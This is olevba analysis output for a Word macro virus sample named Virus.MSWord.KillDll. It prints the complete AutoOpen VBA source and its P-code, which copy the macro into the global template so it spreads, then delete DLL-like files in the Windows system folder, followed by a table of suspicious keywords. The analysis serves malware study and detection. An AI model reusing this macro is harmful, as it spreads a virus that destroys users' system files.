olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.KillDll
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.KillDll - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.KillDll - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim source$
Dim target$
Dim fname$
Dim del$
    source$ = WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)) + ":AutoOpen"
    target$ = WordBasic.[FileName$]() + ":AutoOpen"
    fname$ = WordBasic.[FileName$]()
    WordBasic.FileSaveAs Name:=fname$, Format:=1
    If (InStr(UCase(source$), "NORMAL.DOT") = 0) Then
            WordBasic.MacroCopy source$, "Global:AutoOpen"
    Else
            WordBasic.MacroCopy "Global:AutoOpen", target$
    End If
    del$ = WordBasic.[Files$]("C:\WINDOWS\SYSTEM\*.D??")
    WordBasic.Kill del$
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.KillDll
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 1738 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn source
' Line #3:
' 	Dim 
' 	VarDefn target
' Line #4:
' 	Dim 
' 	VarDefn fname
' Line #5:
' 	Dim 
' 	VarDefn del
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitStr 0x0009 ":aUToOpEn"
' 	Add 
' 	St source$ 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":aUToOpEn"
' 	Add 
' 	St target$ 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St fname$ 
' Line #9:
' 	Ld fname$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #10:
' 	Ld source$ 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "NORMAL.DOT"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #11:
' 	Ld source$ 
' 	LitStr 0x000F "Global:aUToOpEn"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	ElseBlock 
' Line #13:
' 	LitStr 0x000F "Global:aUToOpEn"
' 	Ld target$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitStr 0x0017 "C:\WINDOWS\SYSTEM\*.D??"
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	St del$ 
' Line #16:
' 	Ld del$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #17:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

